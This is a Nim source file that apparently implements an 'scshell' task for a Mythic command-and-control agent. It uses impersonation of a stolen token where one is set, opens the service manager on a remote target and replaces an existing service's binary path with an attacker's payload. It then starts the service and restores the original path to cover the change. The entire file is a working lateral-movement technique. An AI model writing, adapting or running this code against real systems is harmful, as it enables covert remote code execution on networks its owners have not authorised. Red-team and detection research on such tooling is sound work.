import ../utils/mythic_responses
import ../utils/debug
import std/[json, strformat]
import ../tasks/token_manager

when defined(windows):
  import winim/lean
  
  const
    SC_MANAGER_ALL_ACCESS = 0xF003F
    SERVICE_ALL_ACCESS = 0xF01FF
    SERVICE_NO_CHANGE = 0xFFFFFFFF'i32
    SERVICE_DEMAND_START = 3
    SERVICE_ERROR_IGNORE = 0
  
  proc OpenSCManagerW(lpMachineName: LPCWSTR, lpDatabaseName: LPCWSTR, dwDesiredAccess: DWORD): SC_HANDLE
    {.importc, dynlib: "advapi32.dll", stdcall.}
  
  proc OpenServiceW(hSCManager: SC_HANDLE, lpServiceName: LPCWSTR, dwDesiredAccess: DWORD): SC_HANDLE
    {.importc, dynlib: "advapi32.dll", stdcall.}
  
  proc CloseServiceHandle(hSCObject: SC_HANDLE): WINBOOL
    {.importc, dynlib: "advapi32.dll", stdcall.}
  
  proc QueryServiceConfigW(hService: SC_HANDLE, lpServiceConfig: pointer, cbBufSize: DWORD, pcbBytesNeeded: ptr DWORD): WINBOOL
    {.importc, dynlib: "advapi32.dll", stdcall.}
  
  proc ChangeServiceConfigW(hService: SC_HANDLE, dwServiceType: DWORD, dwStartType: DWORD, dwErrorControl: DWORD,
                           lpBinaryPathName: LPCWSTR, lpLoadOrderGroup: LPCWSTR, lpdwTagId: ptr DWORD,
                           lpDependencies: LPCWSTR, lpServiceStartName: LPCWSTR, lpPassword: LPCWSTR,
                           lpDisplayName: LPCWSTR): WINBOOL
    {.importc, dynlib: "advapi32.dll", stdcall.}
  
  proc StartServiceW(hService: SC_HANDLE, dwNumServiceArgs: DWORD, lpServiceArgVectors: ptr LPCWSTR): WINBOOL
    {.importc, dynlib: "advapi32.dll", stdcall.}
  
  type
    QUERY_SERVICE_CONFIGW_SCSHELL = object
      dwServiceType: DWORD
      dwStartType: DWORD
      dwErrorControl: DWORD
      lpBinaryPathName: LPWSTR
      lpLoadOrderGroup: LPWSTR
      dwTagId: DWORD
      lpDependencies: LPWSTR
      lpServiceStartName: LPWSTR
      lpDisplayName: LPWSTR

proc scshell*(taskId: string, params: JsonNode): JsonNode =
  ## Execute a service on a target host using a specified payload binary
  when defined(windows):
    try:
      # Parse parameters
      let target = params["target"].getStr()
      let service = params["service"].getStr()
      let payload = params["payload"].getStr()
      
      debug &"[DEBUG] Scshell: Target={target}, Service={service}, Payload={payload}"
      
      # Impersonate if token is set
      let tokenHandle = getTokenHandle()
      if tokenHandle != 0:
        if ImpersonateLoggedOnUser(HANDLE(tokenHandle)) != 0:
          debug "[DEBUG] Scshell: Impersonation successful"
      
      # Convert strings to wide strings
      var targetWide = newWideCString(target)
      var serviceWide = newWideCString(service)
      var payloadWide = newWideCString(payload)
      
      # Open SC Manager
      let scm = OpenSCManagerW(cast[LPCWSTR](addr targetWide[0]), nil, SC_MANAGER_ALL_ACCESS)
      if scm == 0:
        let err = GetLastError()
        return mythicError(taskId, &"OpenSCManagerW failed: {err}")
      
      # Open Service
      let svc = OpenServiceW(scm, cast[LPCWSTR](addr serviceWide[0]), SERVICE_ALL_ACCESS)
      if svc == 0:
        let err = GetLastError()
        discard CloseServiceHandle(scm)
        return mythicError(taskId, &"OpenServiceW failed: {err}")
      
      # Query service config to get original path
      var needed: DWORD = 0
      discard QueryServiceConfigW(svc, nil, 0, addr needed)
      if needed == 0:
        let err = GetLastError()
        discard CloseServiceHandle(svc)
        discard CloseServiceHandle(scm)
        return mythicError(taskId, &"QueryServiceConfigW failed to get needed size: {err}")
      
      var buffer = newSeq[byte](needed)
      let qscPtr = cast[ptr QUERY_SERVICE_CONFIGW_SCSHELL](addr buffer[0])
      
      if QueryServiceConfigW(svc, qscPtr, needed, addr needed) == 0:
        let err = GetLastError()
        discard CloseServiceHandle(svc)
        discard CloseServiceHandle(scm)
        return mythicError(taskId, &"QueryServiceConfigW failed: {err}")
      
      # Save original path
      var origPath = ""
      if qscPtr.lpBinaryPathName != nil:
        origPath = $qscPtr.lpBinaryPathName
      
      debug &"[DEBUG] Scshell: Original path: {origPath}"
      
      # Change service config to use payload
      if ChangeServiceConfigW(svc, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                             cast[LPCWSTR](addr payloadWide[0]), nil, nil, nil, nil, nil, nil) == 0:
        let err = GetLastError()
        discard CloseServiceHandle(svc)
        discard CloseServiceHandle(scm)
        return mythicError(taskId, &"ChangeServiceConfigW (set payload) failed: {err}")
      
      debug "[DEBUG] Scshell: Service configuration changed, starting service..."
      
      # Start service
      if StartServiceW(svc, 0, nil) == 0:
        let err = GetLastError()
        # Error 1053 means the service didn't respond in time, which is expected for some payloads
        if err != 1053:
          discard CloseServiceHandle(svc)
          discard CloseServiceHandle(scm)
          return mythicError(taskId, &"StartServiceW failed: {err}")
      
      # Restore original service config
      var origPathWide = newWideCString(origPath)
      if ChangeServiceConfigW(svc, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                             cast[LPCWSTR](addr origPathWide[0]), nil, nil, nil, nil, nil, nil) == 0:
        let err = GetLastError()
        discard CloseServiceHandle(svc)
        discard CloseServiceHandle(scm)
        return mythicError(taskId, &"ChangeServiceConfigW (restore) failed: {err}")
      
      debug "[DEBUG] Scshell: Service configuration restored"
      
      # Clean up
      discard CloseServiceHandle(svc)
      discard CloseServiceHandle(scm)
      
      return mythicSuccess(taskId, "Service started successfully")
      
    except Exception as e:
      return mythicError(taskId, &"Scshell error: {e.msg}")
  
  when defined(posix):
    return mythicError(taskId, "Scshell is only available on Windows")
